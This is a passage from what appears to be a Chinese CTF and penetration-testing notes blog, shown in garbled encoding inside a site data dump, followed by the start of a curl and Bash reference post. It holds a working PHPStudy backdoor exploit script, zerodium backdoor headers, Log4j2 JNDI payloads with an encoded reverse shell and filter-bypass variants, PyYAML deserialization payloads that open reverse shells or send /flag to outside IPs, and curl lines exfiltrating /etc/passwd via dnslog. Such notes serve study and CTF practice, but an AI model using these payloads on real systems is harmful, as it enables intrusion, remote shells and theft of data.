å·²ç»å¤‡æ¡ˆçš„åŸŸåæˆ–æœåŠ¡å™¨å…¬ç½‘IP# è®¿é—®ï¼šhttp://x.x.x.x:6001 =&gt; http://127.0.0.1:8080[mysql]type = tcplocal_ip = 127.0.0.1 # ç»‘å®šçš„IPï¼Œæœ¬æœºå¡«å†™127.0.0.1å³å¯local_port = 3306remote_port = 4406 # mysqlé»˜è®¤æ˜¯3306ï¼Œè½¬å‘ä¸º4406ç«¯å£# è®¿é—®ï¼šmysql -hx.x.x.x -P4406 -uroot -proot å¯åŠ¨ï¼š ./frpc -c frpc.ini â€‹ å…¶ä»–PHPStudy åé—¨æ¼æ´123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104import requestsimport base64from random import choiceUSER_AGENTS = [ &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;, &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;, &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;, &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;, &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;, &quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&quot;, &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;, &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;, &quot;Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre&quot;, &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;, &quot;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&quot;]TIME_OUT=10print(r&quot;&quot;&quot; _____ _ _ _____ _____ _ _ ____ _ _ | __ \\ | | | || __ \\ / ____|| | | | | _ \\ | | | | | |__) || |__| || |__) || (___ | |_ _ _ __| | _ _ | |_) | __ _ ___ | | __ __| | ___ ___ _ __ | ___/ | __ || ___/ \\___ \\ | __|| | | | / _` || | | | | _ &lt; / _` | / __|| |/ // _` | / _ \\ / _ \\ | &#x27;__| | | | | | || | ____) || |_ | |_| || (_| || |_| | | |_) || (_| || (__ | &lt;| (_| || (_) || (_) || | |_| |_| |_||_| |_____/ \\__| \\__,_| \\__,_| \\__, | |____/ \\__,_| \\___||_|\\_\\\\__,_| \\___/ \\___/ |_| __/ | |___/ Usage &amp; e.g. : Target Url: localhost/flag.php Input Your Command: phpinfo(); Notice: Command Must Be PHP Function, If You Want To Execute OS Command, Use: system(&#x27;YOUR COMMAND&#x27;); By:Sp4ce Have Fun&quot;&quot;&quot;)def checkTarget(url): poc = &#123; &quot;Accept-Charset&quot;: &quot;cGhwaW5mbygpOw==&quot;, &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot; &#125; try: pocRequest = requests.get(url, headers=poc,timeout=TIME_OUT) if &quot;phpinfo&quot; in str(pocRequest.content): print(&#x27;[+] Target is vulnerable.&#x27;) return True else: print(&#x27;[-] Target is NOT vulnerable.&#x27;) return False except : print(&#x27;[-] Looks Like Something Wrong.&#x27;)def exploit(url,command): headers = &#123;&#125; headers[&#x27;User-Agent&#x27;] = choice(USER_AGENTS) headers[&#x27;Accept-Encoding&#x27;] = &#x27;gzip,deflate&#x27; headers[&#x27;Accept-Charset&#x27;] = command try: request = requests.get(url, headers=headers) if request.status_code == 200: print(&#x27;[+] Command Execute Successful.&#x27;) print(request.text) else: print(&#x27;[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.&#x27;) except: print(&#x27;[-] Looks Like Something Wrong.\\n&#x27;)if __name__ == &quot;__main__&quot;: while True: url = input(&quot;Target Url:\\n&quot;) if &#x27;http&#x27; not in url: url = &quot;http://&quot; + url print(&#x27;[i] Checking Target...&#x27;) if checkTarget(url): cmd = input(&quot;Input Your Command:\\n&quot;) command = base64.b64encode(cmd.encode(&#x27;utf-8&#x27;)) exploit(url,command) zerodium åé—¨åˆ—ç›®å½•ï¼šUser-Agentt: zerodiumsystem(&#39;ls /&#39;); è¯»æ–‡ä»¶ï¼šUser-Agentt: zerodiumsystem(&#39;cat /flag&#39;); log4j2 æ¼æ´ï¼ˆCVE-2021-44228ï¼‰æ­¥éª¤ï¼š åœ¨vpsä¸Šé€šè¿‡ JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar å¯åŠ¨ç›‘å¬ 123java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny54eHgueHh4LjIyMC8yMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;47.xxx.xxx.220&quot;# YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny54eHgueHh4LjIyMC8yMzMzIDA+JjE= ä¸º bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.220/2333 0&gt;&amp;1, ç”¨äºåå¼¹shell å°†payloadå¡«å…¥æ‰¾åˆ°çš„æ¼æ´å¤„ 1$&#123;jndi:ldap:$&#123;sys:file.separator&#125;$&#123;sys:file.separator&#125;47.xxx.xxx.220:1389$&#123;sys:file.separator&#125;ge5udq&#125; å‚è€ƒï¼šApache Log4j2æ¼æ´å¤ç°-åå¼¹shell ç»•è¿‡ï¼š 12345678$&#123;jndi:ladp://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;::-j&#125;ndi:rmi://xxxxxx.dnslog.cn/exp&#125;$&#123;jndi:rmi://xxxxxx.dnslog.cn&#125;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://xxxxxx.dnslog.cn/exp&#125;$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://xxxxxx.dnslog.cn/exp&#125; PyYAMLæ¼æ´ï¼ˆCVE-2020-1747ï¼‰ç‰ˆæœ¬ï¼š5.3 123456789# pyyaml==5.3 required. Vulnerability has been fixed in 5.3.1# More: ret2libc&#x27;s report in https://github.com/yaml/pyyaml/pull/386# Explanation: https://2130706433.net/blog/pyyaml/from yaml import *with open(&#x27;payload.yaml&#x27;,&#x27;rb&#x27;) as f: content = f.read()data = load(content, Loader=FullLoader) # Using vulnerable FullLoader RCEï¼š 123456789!!python/object/new:str args: [] state: !!python/tuple - &quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/IP/PORT &lt;&amp;1\\&quot;&#x27;)&quot; - !!python/object/new:staticmethod args: [] state: update: !!python/name:eval items: !!python/name:list 12345678910# payload.yaml# The `extend` function is overriden to run `yaml.unsafe_load` with # custom `listitems` argument, in this case a simple curl request- !!python/object/new:yaml.MappingNode listitems: !!str &#x27;!!python/object/apply:subprocess.Popen [[&quot;curl&quot;, &quot;http://127.0.0.1/rce&quot;]]&#x27; state: tag: !!str dummy value: !!str dummy extend: !!python/name:yaml.unsafe_load 123!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval ,[&quot;\\x5f\\x5fimport\\x5f\\x5f(&#x27;os&#x27;)\\x2esystem(&#x27;curl http://xxx.xxx.xxx.xxx:1234 -d@/flag&#x27;)&quot;]]] 123!!python/object/new:type args: [&quot;z&quot;, !!python/tuple [], &#123;&quot;extend&quot;: !!python/name:exec &#125;] listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;curl -d @/flag http://111.111.111.111:8082&#x27;)&quot; å‚è€ƒï¼š æµ…è°ˆPyYAMLååºåˆ—åŒ–æ¼æ´ PyYAMLååºåˆ—åŒ–é˜²å¾¡å’ŒByPass uiuctf 2020 Development Serveræºç æ³„éœ²ï¼ˆCNVD-2023-05738ï¼‰PHP&lt;=7.4.21 Development Serveræºç æ³„éœ²æ¼æ´ PHP Development Serverå­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œè¯¥æ¼æ´æºäºphp cli server begin send staticåœ¨è§£æhttpè¯·æ±‚æ—¶å­˜åœ¨é€»è¾‘æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´å°†ä¸¤ä¸ªè¯·æ±‚æ‹¼æ¥è‡³ä¸€ä¸ªhttpè¯·æ±‚ä¸­å¯¼è‡´æœåŠ¡å™¨å°†phpæ–‡ä»¶ä½œä¸ºé™æ€æ–‡ä»¶è¿”å›ã€‚ 1234567GET /A.php HTTP/1.1\\r\\nHost: 1.1.1.1:8888\\r\\n\\r\\n\\r\\nGET / HTTP/1.1\\r\\n\\r\\n","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://lazzzaro.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://lazzzaro.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"å†…ç½‘","slug":"å†…ç½‘","permalink":"https://lazzzaro.github.io/tags/%E5%86%85%E7%BD%91/"}],"author":"Lazzaro"},{"title":"å‘½ä»¤è¡Œå·¥å…·","slug":"misc-å‘½ä»¤è¡Œå·¥å…·","date":"2020-07-05T12:12:03.000Z","updated":"2022-01-03T06:31:08.187Z","comments":true,"path":"2020/07/05/misc-å‘½ä»¤è¡Œå·¥å…·/","permalink":"https://lazzzaro.github.io/2020/07/05/misc-%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7/","excerpt":"","text":"â€‹ æ¨¡æ‹Ÿå·¥å…·RequestBinï¼šhttp://requestbin.net/ ï¼ˆè°ƒè¯•http/httpsäº¤äº’ï¼‰ Ceyeï¼šhttp://ceye.io/ ï¼ˆæ£€æµ‹å¸¦å¤–æµé‡çš„ç›‘æ§å¹³å°ï¼Œå¦‚DNSæŸ¥è¯¢å’ŒHTTPè¯·æ±‚ï¼Œæ”¶é›†ä¿¡æ¯SSRF / XXE / RFI / RCEï¼‰ DNSlogï¼šhttp://www.dnslog.cn/ ï¼ˆè§£æå­åŸŸåå­˜æ”¾çš„æ¼æ´ï¼Œå‘èµ·DNSè¯·æ±‚ï¼Œæ—¥å¿—åå¼¹ï¼‰ bashuploadï¼šhttps://bashupload.com/ ï¼ˆä»å‘½ä»¤è¡Œä¸Šä¼ æ–‡ä»¶ï¼Œåˆ†æç»™å…¶ä»–çš„æœåŠ¡å™¨ï¼‰ â€‹ Linux Bashå†…ç½®å˜é‡ BASHç”¨é€”ï¼šæ˜¾ç¤ºbashçš„å®Œæ•´è·¯å¾„åã€‚é€šå¸¸æ˜¯ï¼š/bin/bashæˆ–/usr/local/bin/bashã€‚ BASH_VERSIONç”¨é€”ï¼šbashçš„ç‰ˆæœ¬ã€‚ FUNCNAMEç”¨é€”ï¼šåœ¨å‡½æ•°å¼æ‰§è¡ŒæœŸï¼Œæ­¤å˜é‡å†…å®¹å³ä¸ºå‡½æ•°å¼çš„åç§°ã€‚ HISTCMDç”¨é€”ï¼šå½“å‰æŒ‡ä»¤æ‰§è¡Œå®Œåï¼Œå®ƒåœ¨å†å²æŒ‡ä»¤ä¸­çš„æ’åˆ—ç¼–å·ï¼ˆæŒ‡å®šç»™ä¸‹ä¸€ä¸ªæŒ‡ä»¤ç”¨çš„å†å²å‘½ä»¤ç¼–å·ï¼‰ã€‚ HISTCONTROLç”¨é€”ï¼šæ§åˆ¶æŒ‡ä»¤æ˜¯å¦å­˜å…¥å†å²è„šæœ¬æ–‡ä»¶ä¸­ã€‚ HISTCONTROLæœ‰3ä¸ªå¯èƒ½çš„è®¾å®šå€¼ï¼š ignorespace: å‡¡æ˜¯æŒ‡ä»¤å¼€å¤´æœ‰ç©ºæ ¼ç¬¦çš„ï¼Œä¸å­˜å…¥å†å²è„šæœ¬æ–‡ä»¶ä¸­ã€‚ ignoredups: è¿ç»­é‡å¤çš„æŒ‡ä»¤ï¼Œåªå­˜ä¸€ä¸ªã€‚ ignoreboth: ç»“åˆå‰ä¸¤è€…çš„åŠŸèƒ½ã€‚ HISTFILEç”¨é€”ï¼šè®¾å®šå†å²è„šæœ¬æ–‡ä»¶çš„è·¯å¾„æ–‡ä»¶åã€‚é€šå¸¸æ˜¯åœ¨ï¼šå®¶ç›®å½•/.bash_history HISTFILESIZEç”¨é€”ï¼šè®¾å®šå†å²è„šæœ¬æ–‡ä»¶å­˜å‚¨æŒ‡ä»¤çš„æœ€å¤§è¡Œæ•°ã€‚ HISTIGNOREç”¨é€”ï¼šä¸å­˜å…¥å†å²è„šæœ¬æ–‡ä»¶çš„æŒ‡ä»¤æ ·å¼ï¼Œä»¥ : éš”å¼€ã€‚ HOMEç”¨é€”ï¼šè®¾å®šç”¨æˆ·çš„å®¶ç›®å½•ä½ç½®ã€‚é€šå¸¸ï¼Œrootçš„å®¶ç›®å½•åœ¨/rootï¼Œä¸€èˆ¬ç”¨æˆ·çš„å®¶ç›®å½•åœ¨/home/è´¦å·ã€‚æ›¿æ¢~çš„ç»“æœï¼Œå°±æ˜¯HOMEå˜é‡å€¼ã€‚ HOSTNAMEç”¨é€”ï¼šæ˜¾ç¤ºä¸»æœºåã€‚ HOSTTYPEç”¨é€”ï¼šæ˜¾ç¤ºä¸»æœºå½¢æ€ã€‚ IFSç”¨é€”ï¼šå®šä¹‰å­—æ®µåˆ†éš”å­—ç¬¦ã€‚é»˜è®¤å€¼ä¸ºï¼šç©ºæ ¼ç¬¦ã€tabå­—ç¬¦ã€æ¢è¡Œå­—ç¬¦(newline)ã€‚ MACHTYPEç”¨é€”ï¼šæè¿°ä¸»æœºå½¢æ€çš„GNUæ ¼å¼ï¼šcpu-å…¬å¸-ç³»ç»Ÿã€‚ MAILç”¨é€”ï¼šæ˜¾ç¤ºå½“å‰ç”¨æˆ·é‚®ä»¶ç›®å½•ã€‚ MAILCHECKç”¨é€”ï¼šæ¯éš”å¤šä¹…å°±æ£€æŸ¥ä¸€æ¬¡é‚®ä»¶ã€‚é€šå¸¸é»˜è®¤æ˜¯60ç§’ã€‚ PATHç”¨é€”ï¼šå‘½ä»¤çš„æœå¯»è·¯å¾„ã€‚ PPIDç”¨é€”ï¼šçˆ¶è¿›ç¨‹çš„è¿›ç¨‹ç¼–å·ã€‚ RANDOMç”¨é€”ï¼šéšæœºå‡½æ•°ã€‚ æ­¤å˜é‡å€¼ï¼Œéšæœºå‡ºç°æ•´æ•°ï¼ŒèŒƒå›´ä¸º0-32767ã€‚ä¸è¿‡ï¼Œè™½ç„¶è¯´æ˜¯éšæœºï¼Œä½†å¹¶ä¸æ˜¯çœŸæ­£çš„éšæœºï¼Œå› ä¸ºæ¯æ¬¡å¾—åˆ°çš„éšæœºæ•°éƒ½ä¸€æ ·ã€‚ä¸ºæ­¤ï¼Œåœ¨ä½¿ç”¨RANDOMå˜é‡å‰ï¼Œè¯·éšæ„è®¾å®šä¸€ä¸ªæ•°å­—ç»™RANDOMï¼Œå½“åšéšæœºæ•°ç§å­ï¼Œè¿™æ ·æ‰ä¸ä¼šæ¯æ¬¡äº§ç”Ÿçš„éšæœºæ•°å…¶é¡ºåºéƒ½ä¸€æ ·ã€‚ REPLYç”¨é€”ï¼šselectå’Œreadæ²¡æœ‰è®¾å®šè¯»å–å˜é‡æ—¶ï¼Œé»˜è®¤çš„å˜é‡åç§°ä¸ºREPLYã€‚ SHLVLç”¨é€”ï¼šå­shellçš„å±‚çº§æ•°ã€‚ $1~$nç”¨é€”ï¼šä½ç½®å‚æ•°ã€‚ ä¼ å…¥ç¨‹åºæˆ–å‡½æ•°å¼çš„å‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°$1ï¼Œç¬¬äºŒå‚æ•°$2ï¼Œå…¶ä»–ç±»æ¨ã€‚ è¯·æ³¨æ„ï¼Œè‹¥ä½ç½®å‚æ•°nè¶…è¿‡9ä»¥ä¸Šï¼Œåˆ™è¦ç”¨$&#123;n&#125;æ¥è¡¨ç¤ºã€‚ $0ä»£è¡¨æ‰§è¡Œç¨‹åºçš„åç§°ã€‚ $*ç”¨é€”ï¼šä»£è¡¨æ‰€æœ‰çš„ä½ç½®å‚æ•°ï¼Œå¹¶ä¸”è§†ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ å¦‚ï¼štest.sh ABC 123 xyzï¼Œåˆ™$*çš„å†…å®¹ä¸ºå­—ç¬¦ä¸²ABC 123 xyz $@ç”¨é€”ï¼šä»£è¡¨æ‰€æœ‰çš„ä½ç½®å‚æ•°ï¼Œä½†$@ä»£è¡¨å„ä½ç½®å‚æ•°ç»„æˆçš„ä¸²è¡Œã€‚ å¦‚ï¼štest.sh ABC 123 xyzï¼Œåˆ™$@çš„å†…å®¹ä¸ºABCã€123ã€xyzè¿™3ä¸ªå­—ç¬¦ä¸²ã€‚ $#ç”¨é€”ï¼šä½ç½®å‚æ•°çš„ä¸ªæ•°ã€‚ å¦‚ï¼štest.sh ABC 123 xyzï¼Œæœ‰3ä¸ªå‚æ•°ï¼Œ$#çš„å€¼ä¸º3ã€‚ $?ç”¨é€”ï¼šä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯ã€‚ $$ç”¨é€”ï¼šç›®å‰bash shellçš„è¿›ç¨‹ç¼–å·ã€‚ $_ç”¨é€”ï¼š a. scriptæ‰§è¡Œæ—¶ï¼Œbashçš„ç»å¯¹è·¯å¾„ã€‚ b. ä¸Šä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ—¶ï¼Œæœ€åä¸€ä¸ªä½ç½®å‚æ•°ï¼Œå¦‚ä¸Šä¸€ä¸ªå‘½ä»¤æ˜¯ï¼štest.sh ABC 123 xyzï¼Œåˆ™$_çš„å€¼ä¸ºxyzã€‚ c. æ£€æŸ¥é‚®ä»¶æ—¶ï¼Œ$_çš„å€¼ä¸ºé‚®ä»¶æ–‡ä»¶åã€‚ â€‹ curlcurl æ˜¯å¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨æ¥è¯·æ±‚ Web æœåŠ¡å™¨ã€‚å®ƒçš„åå­—å°±æ˜¯å®¢æˆ·ç«¯ï¼ˆclientï¼‰çš„ URL å·¥å…·çš„æ„æ€ã€‚ å®ƒçš„åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œå‘½ä»¤è¡Œå‚æ•°å¤šè¾¾å‡ åç§ã€‚å¦‚æœç†Ÿç»ƒçš„è¯ï¼Œå®Œå…¨å¯ä»¥å–ä»£ Postman è¿™ä¸€ç±»çš„å›¾å½¢ç•Œé¢å·¥å…·ã€‚ ä¸å¸¦æœ‰ä»»ä½•å‚æ•°æ—¶ï¼Œcurl å°±æ˜¯å‘å‡º GET è¯·æ±‚ã€‚ $ curl https://www.example.com æ‰§è¡Œå‘½ä»¤ï¼š 12$ curl http://requestbin.net/r/1kiej1p1?p=`whoami`$ curl `cat /etc/passwd|base64`.xxxxxx.dnslog.cn #dnslogå¸¦å¤– å‚æ•°è¯´æ˜ï¼š -A æŒ‡å®šå®¢æˆ·ç«¯çš„ç”¨æˆ·ä»£ç†æ ‡å¤´ï¼Œå³User-Agentã€‚curl çš„é»˜è®¤ç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²æ˜¯curl/[version]ã€‚ 1$ curl -A &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#x27; https://google.com -b å‘æœåŠ¡å™¨å‘é€ Cookieã€‚ 1$ curl -b &#x27;foo=bar&#x27; https://google.com ä¸Šé¢å‘½ä»¤ä¼šç”Ÿæˆä¸€ä¸ªæ ‡å¤´Cookie: foo=barï¼Œå‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªåä¸ºfooã€å€¼ä¸ºbarçš„ Cookieã€‚ -c -cå‚æ•°å°†æœåŠ¡å™¨è®¾ç½®çš„ Cookie å†™å…¥ä¸€ä¸ªæ–‡ä»¶ã€‚ 1$ curl -c cookies.txt https://www.google.com ä¸Šé¢å‘½ä»¤å°†æœåŠ¡å™¨çš„ HTTP å›åº”æ‰€è®¾ç½® Cookie å†™å…¥æ–‡æœ¬æ–‡ä»¶cookies.txtã€‚ -d -då‚æ•°ç”¨äºå‘é€ POST è¯·æ±‚çš„æ•°æ®ä½“ã€‚ 123$ curl -d&#x27;login=emma&amp;password=123&#x27;-X POST https://google.com/login # æˆ–è€… $ curl -d &#x27;login=emma&#x27; -d &#x27;password=123&#x27; -X POST https://google.com/login ä½¿ç”¨-då‚æ•°ä»¥åï¼ŒHTTP è¯·æ±‚ä¼šè‡ªåŠ¨åŠ ä¸Šæ ‡å¤´Content-Type : application/x-www-form-urlencodedã€‚å¹¶ä¸”ä¼šè‡ªåŠ¨å°†è¯·æ±‚è½¬ä¸º POST æ–¹æ³•ï¼Œå› æ­¤å¯ä»¥çœç•¥-X POSTã€‚ --data-urlencode --data-urlencodeå‚æ•°ç­‰åŒäº-dï¼Œå‘é€ POST è¯·æ±‚çš„æ•°æ®ä½“ï¼ŒåŒºåˆ«åœ¨äºä¼šè‡ªåŠ¨å°†å‘é€çš„æ•°æ®è¿›è¡Œ URL ç¼–ç ã€‚ 1$ curl --data-urlencode &#x27;comment=hello world&#x27; https://google.com/login ä¸Šé¢ä»£ç ä¸­ï¼Œå‘é€çš„æ•°æ®hello worldä¹‹é—´æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œéœ€è¦è¿›è¡Œ URL ç¼–ç ã€‚ -e -eå‚æ•°ç”¨æ¥è®¾ç½® HTTP çš„æ ‡å¤´Refererï¼Œè¡¨ç¤ºè¯·æ±‚çš„æ¥æºã€‚ 1curl -e &#x27;https://google.com?q=example&#x27; https://www.example.com ä¸Šé¢å‘½ä»¤å°†Refereræ ‡å¤´è®¾ä¸ºhttps://google.com?q=exampleã€‚ -G -Gå‚æ•°ç”¨æ¥æ„é€  URL çš„æŸ¥è¯¢å­—ç¬¦ä¸²ã€‚ 1$ curl -G -d &#x27;q=kitties&#x27; -d &#x27;count=20&#x27; https://google.com/search ä¸Šé¢å‘½ä»¤ä¼šå‘å‡ºä¸€ä¸ª GET è¯·æ±‚ï¼Œå®é™…è¯·æ±‚çš„ URL ä¸ºhttps://google.com/search?q=kitties&amp;count=20ã€‚å¦‚æœçœç•¥--Gï¼Œä¼šå‘å‡ºä¸€ä¸ª POST è¯·æ±‚ã€‚ å¦‚æœæ•°æ®éœ€è¦ URL ç¼–ç ï¼Œå¯ä»¥ç»“åˆ--data--urlencodeå‚æ•°ã€‚ 1$ curl -G --data-urlencode &#x27;comment=hello world&#x27; https://www.example.com -H -Hå‚æ•°æ·»åŠ  HTTP è¯·æ±‚çš„æ ‡å¤´ã€‚ 1$ curl -H &#x27;Accept-Language: en-US&#x27; https://google.com ä¸Šé¢å‘½ä»¤æ·»åŠ  HTTP æ ‡å¤´Accept-Language: en-USã€‚ 1$ curl -H &#x27;Accept-Language: en-US&#x27; -H &#x27;Secret-Message: xyzzy&#x27; https://google.com ä¸Šé¢å‘½ä»¤æ·»åŠ ä¸¤ä¸ª HTTP æ ‡å¤´ã€‚ 1$ curl -d &#x27;&#123;&quot;login&quot;: &quot;emma&quot;, &quot;pass&quot;: &quot;123&quot;&#125;&#x27; -H &#x27;Content-Type: application/json&#x27; https://google.com/login ä¸Šé¢å‘½ä»¤æ·»åŠ  HTTP è¯·æ±‚çš„æ ‡å¤´æ˜¯Content-Type: application/jsonï¼Œç„¶åç”¨-då‚æ•°å‘é€ JSON æ•°æ®ã€‚ 1$ curl -H &#x27;User-Agent: php/1.0&#x27; https://google.com ä¸Šé¢å‘½ä»¤é€šè¿‡-Hå‚æ•°ç›´æ¥æŒ‡å®šæ ‡å¤´ï¼Œæ›´æ”¹User-Agentã€‚ 1$ curl -H &#x27;Referer: 